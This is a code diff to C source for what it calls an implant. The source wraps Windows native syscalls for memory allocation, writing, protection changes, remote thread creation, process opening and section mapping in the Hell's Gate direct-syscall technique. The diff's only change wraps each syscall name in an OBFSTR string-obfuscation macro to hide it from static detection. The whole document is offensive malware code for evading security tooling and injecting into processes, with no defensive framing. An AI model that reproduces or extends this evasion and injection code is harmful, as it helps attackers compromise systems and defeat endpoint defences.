@@ -8,11 +8,12 @@
  *       the assembly stub does mov r10,rcx; mov eax,g_ssn; jmp [g_gadget])
  */
 #include "../include/implant.h"
+#include "../include/obfstr.h"
 
 /* ── NtAllocateVirtualMemory ─────────────────────────────────────────────── */
 NTSTATUS NtAlloc(HANDLE hProc, PVOID *base, SIZE_T size, ULONG protect) {
     SIZE_T sz = size;
-    if (!HellsGateSetSSN("NtAllocateVirtualMemory")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtAllocateVirtualMemory"))) return (NTSTATUS)0xC0000001;
     return HellsGateCall(
         (PVOID)hProc,
         (PVOID)base,
@@ -27,7 +28,7 @@ NTSTATUS NtAlloc(HANDLE hProc, PVOID *base, SIZE_T size, ULONG protect) {
 /* ── NtFreeVirtualMemory ──────────────────────────────────────────────────── */
 NTSTATUS NtFree(HANDLE hProc, PVOID base) {
     SIZE_T sz = 0;
-    if (!HellsGateSetSSN("NtFreeVirtualMemory")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtFreeVirtualMemory"))) return (NTSTATUS)0xC0000001;
     return HellsGateCall(
         (PVOID)hProc,
         (PVOID)&base,
@@ -40,7 +41,7 @@ NTSTATUS NtFree(HANDLE hProc, PVOID base) {
 /* ── NtWriteVirtualMemory ─────────────────────────────────────────────────── */
 NTSTATUS NtWrite(HANDLE hProc, PVOID addr, PVOID data, SIZE_T size) {
     SIZE_T written = 0;
-    if (!HellsGateSetSSN("NtWriteVirtualMemory")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtWriteVirtualMemory"))) return (NTSTATUS)0xC0000001;
     return HellsGateCall(
         (PVOID)hProc,
         addr,
@@ -55,7 +56,7 @@ NTSTATUS NtWrite(HANDLE hProc, PVOID addr, PVOID data, SIZE_T size) {
 NTSTATUS NtProtect(HANDLE hProc, PVOID addr, SIZE_T size, ULONG newProt, ULONG *oldProt) {
     SIZE_T sz = size;
     ULONG  old = 0;
-    if (!HellsGateSetSSN("NtProtectVirtualMemory")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtProtectVirtualMemory"))) return (NTSTATUS)0xC0000001;
     NTSTATUS st = HellsGateCall(
         (PVOID)hProc,
         (PVOID)&addr,
@@ -75,7 +76,7 @@ NTSTATUS NtCreateThread(HANDLE hProc, PVOID startAddr, PVOID param, HANDLE *hThr
          ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
          StartRoutine, Argument, CreateFlags, ZeroBits,
          StackSize, MaximumStackSize, AttributeList) */
-    if (!HellsGateSetSSN("NtCreateThreadEx")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtCreateThreadEx"))) return (NTSTATUS)0xC0000001;
     NTSTATUS st = HellsGateCall(
         (PVOID)&hThr,
         (PVOID)(ULONG_PTR)0x1FFFFF,  /* THREAD_ALL_ACCESS */
@@ -99,7 +100,7 @@ NTSTATUS NtOpenProc(DWORD pid, DWORD access, HANDLE *hOut) {
     cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
     cid.UniqueThread  = NULL;
     ULONG_PTR hProc = 0;
-    if (!HellsGateSetSSN("NtOpenProcess")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtOpenProcess"))) return (NTSTATUS)0xC0000001;
     NTSTATUS st = HellsGateCall(
         (PVOID)&hProc,
         (PVOID)(ULONG_PTR)access,
@@ -115,7 +116,7 @@ NTSTATUS NtOpenProc(DWORD pid, DWORD access, HANDLE *hOut) {
 NTSTATUS NtDelay(LONGLONG hundredNs) {
     /* Negative = relative interval */
     LONGLONG interval = -hundredNs;
-    if (!HellsGateSetSSN("NtDelayExecution")) {
+    if (!HellsGateSetSSN(OBFSTR("NtDelayExecution"))) {
         Sleep((DWORD)(hundredNs / 10000));
         return STATUS_SUCCESS;
     }
@@ -130,7 +131,7 @@ NTSTATUS NtDelay(LONGLONG hundredNs) {
 NTSTATUS NtQueryProcInfo(HANDLE hProc, PROCESSINFOCLASS cls,
                           PVOID buf, ULONG len, ULONG *retLen) {
     ULONG ret = 0;
-    if (!HellsGateSetSSN("NtQueryInformationProcess")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtQueryInformationProcess"))) return (NTSTATUS)0xC0000001;
     NTSTATUS st = HellsGateCall(
         (PVOID)hProc,
         (PVOID)(ULONG_PTR)cls,
@@ -149,7 +150,7 @@ NTSTATUS NtOpenFile(NT_UNICODE_STRING *path, ULONG access, HANDLE *hOut) {
                                  OBJ_CASE_INSENSITIVE, NULL, NULL };
     NT_IO_STATUS_BLOCK   iosb = {0};
     ULONG_PTR h = 0;
-    if (!HellsGateSetSSN("NtCreateFile")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtCreateFile"))) return (NTSTATUS)0xC0000001;
     NTSTATUS st = HellsGateCall(
         (PVOID)&h,
         (PVOID)(ULONG_PTR)(NT_FILE_READ_DATA | SYNCHRONIZE),
@@ -168,7 +169,7 @@ NTSTATUS NtOpenFile(NT_UNICODE_STRING *path, ULONG access, HANDLE *hOut) {
 /* ── NtCreateSection ─────────────────────────────────────────────────────── */
 NTSTATUS NtMapSection(HANDLE hFile, PVOID *baseOut, SIZE_T *viewSize) {
     ULONG_PTR hSec = 0;
-    if (!HellsGateSetSSN("NtCreateSection")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtCreateSection"))) return (NTSTATUS)0xC0000001;
     NT_OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, 0, NULL, NULL };
     NTSTATUS st = HellsGateCall(
         (PVOID)&hSec,
@@ -186,9 +187,9 @@ NTSTATUS NtMapSection(HANDLE hFile, PVOID *baseOut, SIZE_T *viewSize) {
     PVOID base = NULL;
     SIZE_T sz  = 0;
     LARGE_INTEGER off = {0};
-    if (!HellsGateSetSSN("NtMapViewOfSection")) {
+    if (!HellsGateSetSSN(OBFSTR("NtMapViewOfSection"))) {
         /* close section handle — best effort */
-        NTSTATUS cs; HellsGateSetSSN("NtClose");
+        NTSTATUS cs; HellsGateSetSSN(OBFSTR("NtClose"));
         HellsGateCall((PVOID)(ULONG_PTR)hSec,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
         return (NTSTATUS)0xC0000001;
     }
@@ -210,14 +211,14 @@ NTSTATUS NtMapSection(HANDLE hFile, PVOID *baseOut, SIZE_T *viewSize) {
         *viewSize = sz;
     }
     /* Close the section handle */
-    HellsGateSetSSN("NtClose");
+    HellsGateSetSSN(OBFSTR("NtClose"));
     HellsGateCall((PVOID)(ULONG_PTR)hSec,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
     return st;
 }
 
 /* ── NtUnmapViewOfSection ────────────────────────────────────────────────── */
 NTSTATUS NtUnmap(PVOID base) {
-    if (!HellsGateSetSSN("NtUnmapViewOfSection")) return (NTSTATUS)0xC0000001;
+    if (!HellsGateSetSSN(OBFSTR("NtUnmapViewOfSection"))) return (NTSTATUS)0xC0000001;
     return HellsGateCall(
         (PVOID)(LONG_PTR)-1,
         base,
